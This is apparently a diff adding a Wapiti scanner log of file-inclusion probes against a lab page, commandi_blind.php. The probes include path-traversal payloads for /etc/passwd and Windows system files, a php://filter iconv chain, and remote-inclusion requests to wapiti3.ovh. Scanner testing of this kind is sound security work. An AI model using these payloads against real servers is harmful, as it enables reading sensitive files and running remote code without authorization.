+2024-03-20 16:35:59.654 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&bug=10
+2024-03-20 16:35:59.668 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&bug=10
+2024-03-20 16:35:59.679 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&bug=10
+2024-03-20 16:35:59.690 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:35:59.702 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:35:59.715 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:35:59.727 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:35:59.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.753 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.765 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.789 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.802 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.815 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.828 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.842 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&bug=10
+2024-03-20 16:35:59.855 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:35:59.867 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:35:59.878 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:35:59.890 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:35:59.902 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.913 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.925 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.938 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.951 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.988 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:36:00.001 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:36:00.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:36:00.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:36:00.036 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:36:00.048 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=10
+2024-03-20 16:36:00.060 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=10
+2024-03-20 16:36:00.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:36:00.085 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:36:00.097 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:36:00.109 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:36:00.120 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:36:00.132 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:36:00.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=file%3A%2F%2F%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:36:00.156 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=10
+2024-03-20 16:36:00.168 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:36:00.181 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:36:00.193 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&bug=10
+2024-03-20 16:36:00.206 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:36:00.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:36:00.231 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:36:00.243 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=commandi_blind.php&bug=10
+2024-03-20 16:36:00.257 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=commandi_blind.php%00&bug=10
+2024-03-20 16:36:00.270 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=commandi_blind.php%3A%3A%24DATA&bug=10
+2024-03-20 16:36:00.289 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:36:00.302 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:36:00.315 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd
+2024-03-20 16:36:00.327 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.338 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices
+2024-03-20 16:36:00.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices%00
+2024-03-20 16:36:00.364 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:36:00.377 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:36:00.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:36:00.407 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.421 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.434 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:36:00.448 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:36:00.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:36:00.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:00.477 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:00.485 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.493 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:00.501 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:00.509 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:00.518 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:00.525 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:00.534 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.541 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:00.550 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.558 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:00.567 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
